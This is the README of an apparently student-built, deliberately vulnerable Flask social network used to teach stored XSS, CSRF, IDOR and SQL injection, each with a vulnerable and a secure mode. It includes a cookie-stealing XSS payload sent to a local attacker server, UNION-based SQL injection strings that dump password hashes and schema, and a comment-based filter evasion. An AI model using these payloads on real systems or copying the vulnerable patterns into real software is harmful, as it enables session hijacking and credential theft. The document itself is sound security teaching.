# MiniRed — TPI Seguridad en el Desarrollo de Software

Mini red social **deliberadamente vulnerable** para analizar, reproducir y corregir
vulnerabilidades web comunes. Cada vulnerabilidad tiene una versión **VULNERABLE** y una
**SEGURA**, conmutables en caliente con un interruptor en la barra superior.

> ⚠️ Es intencionalmente insegura. Correr **solo en localhost**. No publicar en Internet.

- **Propuesta A:** XSS persistente, CSRF, IDOR (interruptor VULNERABLE / SEGURO).
- **Propuesta B:** SQL Injection comparando 3 versiones del mismo endpoint (v1 concatenación, v2 filtros/lista negra, v3 parametrizada).

---

## 1. Requisitos e instalación

- Python 3.10+ (probado con 3.14)
- Flask (`pip install flask`)

No usa base de datos externa: crea sola un archivo SQLite `minired.db` en la primera ejecución.

## 2. Cómo ejecutar

Abrir **dos** terminales en la carpeta `TPI-MiniRed`.

Terminal 1 — la aplicación (víctima), en `http://localhost:5000`:

```bash
python app.py
```

Terminal 2 — el sitio del atacante (para CSRF y XSS), en `http://localhost:5001`:

```bash
python atacante.py
```

### Usuarios de prueba

| Usuario   | Contraseña   | Rol en la demo         |
|-----------|--------------|------------------------|
| `admin`   | `admin123`   | administrador          |
| `alice`   | `alice123`   | víctima                |
| `bob`     | `bob123`     | víctima                |
| `mallory` | `mallory123` | atacante               |

### Controles de la demo (barra roja/verde superior)

- **Cambiar a SEGURO / VULNERABLE:** activa o desactiva todas las correcciones a la vez.
- **Reiniciar BD:** vuelve la base a su estado original (útil entre pruebas).

El color de la barra indica el modo: **rojo = VULNERABLE**, **verde = SEGURO**.

---

## 3. Las vulnerabilidades (qué explicar en la defensa)

Para cada una: **qué es → dónde está en el código → cómo reproducirla → impacto → cómo se corrige**.
En el código, los puntos están marcados con comentarios `[VULN-...]` y `[FIX-...]` para que los encuentres rápido.

### 3.1 XSS persistente (Cross-Site Scripting almacenado)

**Qué es.** El servidor guarda texto del usuario y lo vuelve a mostrar a *otros* usuarios sin
neutralizar el HTML. Si el texto contiene código, el navegador de quien lo lee lo **ejecuta**
como si viniera del sitio. "Persistente" = queda guardado en la BD y afecta a todo el que abra la página.

**Dónde está.** `templates/muro.html`:
- Vulnerable: `{{ p.content|safe }}` — el filtro `|safe` **desactiva** el escapado de Jinja.
- Seguro: `{{ p.content }}` — Jinja escapa `< > " ' &` (codificación de salida).
En `app.py`, config de cookie: vulnerable sin `HttpOnly`; seguro con `HttpOnly` + CSP (`cabeceras_seguridad`).

**Cómo reproducirla (modo VULNERABLE):**
1. Iniciá sesión como `mallory`.
2. En el muro publicá este comentario:
   ```html
   <img src=x onerror="new Image().src='http://localhost:5001/captura?c='+encodeURIComponent(document.cookie)">
   ```
3. El script se ejecuta solo al renderizar la imagen rota (`onerror`). Como el muro es compartido,
   **se ejecuta también en el navegador de Alice o Bob** cuando abren el muro.
4. Abrí `http://localhost:5001/evidencia`: vas a ver la **cookie de sesión** de la víctima capturada.

**Impacto.** Robo de la cookie de sesión (suplantación), robo de datos de la página,
desfiguración (defacement), redirección a sitios falsos, keylogging. Afecta a todos los usuarios, no a uno solo.

**Cómo se corrige (modo SEGURO):**
- **Codificación de salida** (defensa principal): mostrar el contenido escapado → `{{ p.content }}`. El `<script>` se ve como texto.
- **Cookie `HttpOnly`:** JavaScript ya no puede leer `document.cookie` (si algo se colara, no roba la sesión).
- **CSP** (`Content-Security-Policy: script-src 'self'`): el navegador no ejecuta scripts inline ni `onerror`, ni carga recursos de otros orígenes.
- Validación de longitud como control complementario (no reemplaza al escapado).
> En SEGURO el comentario se muestra como texto literal y `/evidencia` recibe la cookie **vacía** (o nada, por CSP).

### 3.2 CSRF (Cross-Site Request Forgery)

**Qué es.** Una página externa fuerza al navegador de la víctima —que **ya tiene sesión abierta**
en la app— a enviar una petición que cambia estado. El navegador adjunta la cookie de sesión
**automáticamente**, así que la app cree que la acción la pidió el usuario.

**Dónde está.** `app.py`:
- Vulnerable: `editar_perfil` acepta cualquier `POST` con cookie válida.
- Seguro: `verificar_csrf()` (`before_request`) exige el **token sincronizador** secreto (`csrf_token`) en el form o en el header `X-CSRF-Token`. Defensa en profundidad con cookie `SameSite=Strict`.

**Cómo reproducirla (modo VULNERABLE):**
1. Iniciá sesión como `alice` en `http://localhost:5000`.
2. En **la misma ventana**, entrá a la página trampa del atacante: `http://localhost:5001/premio`.
3. Esa página tiene un formulario oculto que hace `POST` a `/perfil/editar`. Se autoenvía solo.
4. Volvé a `http://localhost:5000/perfil` (o "Editar perfil"): el perfil de Alice quedó **modificado**
   (nombre/email/bio cambiados) sin que ella lo tocara.

**Impacto.** Cambios no autorizados en la cuenta: cambiar email de recuperación, contraseña,
transferencias, borrados — cualquier acción que cambie estado y no se verifique.

**Cómo se corrige (modo SEGURO):**
- **Token anti-CSRF (Synchronizer Token):** token aleatorio por sesión, incrustado en cada formulario.
  El servidor rechaza (`403`) si falta o no coincide. Un sitio externo **no puede leerlo** (Same-Origin Policy), así que no puede falsificar la petición.
- **Cookie `SameSite=Strict`:** el navegador no manda la cookie en peticiones cross-site (defensa adicional).
> En SEGURO, reproducir el ataque devuelve **403** ("Token CSRF ausente o inválido").

### 3.3 IDOR (Insecure Direct Object Reference)

**Qué es.** La app expone recursos por un identificador directo (ej. `/api/users/3`) y verifica que
estés **autenticado**, pero **no** que el recurso sea **tuyo**. Cambiando el número accedés a datos de otros.

**Dónde está.** `app.py`, `api_get_usuario` y `api_put_usuario`:
- Vulnerable: solo `@login_requerido`; devuelve/edita cualquier `uid`.
- Seguro: compara `uid == session["user_id"]`. Si no es tuyo, GET solo da campos públicos y PUT devuelve `403`.

**Cómo reproducirla (modo VULNERABLE):**
1. Iniciá sesión como `alice` (id 2).
2. Entrá a "Mi perfil" y cambiá el id en la URL: `http://localhost:5000/perfil?id=1` (admin), `?id=3` (bob).
3. La API `GET /api/users/1` devuelve **datos privados** de otro usuario: email, teléfono, DNI, `is_admin`.
4. Desde "Editar vía API" podés incluso hacer `PUT` sobre el perfil de otro usuario.

**Impacto.** Fuga de datos personales (habilita phishing/robo de identidad) y modificación de cuentas ajenas.
Es de las fallas más comunes y de alto impacto (OWASP: Broken Access Control).

**Cómo se corrige (modo SEGURO):**
- **Control de acceso a nivel de objeto:** en cada operación, verificar que el recurso pertenece al usuario autenticado (`uid == session["user_id"]`).
- Principio de **mínima exposición**: a terceros, solo campos públicos.
- (Buena práctica adicional, no imprescindible: usar identificadores no adivinables tipo UUID.)
> En SEGURO, `GET` de otro usuario devuelve solo `{id, username, display_name, bio}` y `PUT` ajeno devuelve **403**.

### 3.4 SQL Injection (Propuesta B)

**Qué es.** La entrada del usuario se mezcla con el texto de la consulta SQL, de modo que puede
**cambiar la estructura** de la consulta (no solo los datos). Permite leer/modificar datos no autorizados.

**Dónde está.** `app.py`, 3 endpoints (independientes del interruptor de modo): `sqli_v1`, `sqli_v2`, `sqli_v3`.
Probalos desde **"Lab SQLi"** (tiene botones con payloads listos).

**v1 — concatenación directa `[VULN-SQLI]`.** `... LIKE '%{q}%'` con el input pegado.
- Payload: `' UNION SELECT id, username, password_hash, email FROM users--`
- Resultado: la consulta devuelve **todos los hashes de contraseñas**. Con `' UNION SELECT 1, name, sql, type FROM sqlite_master--` se vuelca el **esquema** de la BD. Además expone el error interno de la BD.

**v2 — filtros / lista negra `[VULN-SQLI]`.** Bloquea patrones como `union select`, `--`, `' or `.
- Demuestra que **no alcanza**: `' UNION SELECT ...--` se bloquea, pero evadiéndolo con comentarios
  `'/**/UNION/**/SELECT/**/id,username,password_hash,email/**/FROM/**/users/*` **vuelve a funcionar**.
- Moraleja: una lista negra siempre se puede sortear (mayúsculas, comentarios, codificación, etc.).

**v3 — consulta parametrizada `[FIX-SQLI]`.** `... LIKE ?` con el valor pasado como **parámetro**.
- El mismo payload `' OR 1=1--` se trata como **texto de búsqueda literal**: devuelve 0 filas, no inyecta.
- Los datos nunca se interpretan como código SQL.

**Impacto.** Lectura de datos sensibles (credenciales), modificación/borrado de datos, y según permisos,
compromiso total de la base. En la demo se ven hashes y esquema completo.

**Cómo se corrige.**
- **Consultas parametrizadas / sentencias preparadas** (defensa principal, v3): separan datos de estructura.
- **Validación de entrada** (tipo/longitud) como complemento.
- **Mínimo privilegio:** v3 usa una conexión de **solo lectura** a la BD; aunque hubiera una falla, no podría escribir.
- **No exponer errores internos** de la BD al cliente (v3 devuelve mensaje genérico).

---

## 4. Guion sugerido para la defensa (demo en vivo)

1. Mostrar barra en **VULNERABLE** (rojo).
2. **XSS:** login `mallory` → publicar el payload del muro → abrir `/evidencia` del atacante y mostrar la cookie robada.
3. **CSRF:** login `alice` → abrir `http://localhost:5001/premio` → volver y mostrar el perfil alterado.
4. **IDOR:** con `alice`, `/perfil?id=1` → mostrar datos privados del admin.
5. **SQLi:** en "Lab SQLi", botón UNION en **v1** (hashes), mostrar que **v2** bloquea pero se evade con `/**/`, y que **v3** es inmune.
6. Clic en **Cambiar a SEGURO** (verde) y **repetir cada paso**: XSS se ve como texto, CSRF da 403, IDOR oculta datos. Para SQLi, comparar v1/v2 contra v3.
7. Cerrar explicando las defensas: codificación de salida + CSP + HttpOnly (XSS), token anti-CSRF + SameSite (CSRF), control de acceso por objeto (IDOR), consultas parametrizadas + mínimo privilegio (SQLi).

## 5. Mapa de archivos

```
TPI-MiniRed/
├── app.py              # aplicación (víctima); marcas [VULN-*] y [FIX-*]
├── atacante.py         # sitio atacante (CSRF /premio, XSS /captura y /evidencia)
├── templates/          # vistas (muro.html tiene el punto VULN/FIX de XSS)
├── static/             # app.js y style.css
├── minired.db          # SQLite (se crea solo)
└── README.md           # esta guía
```
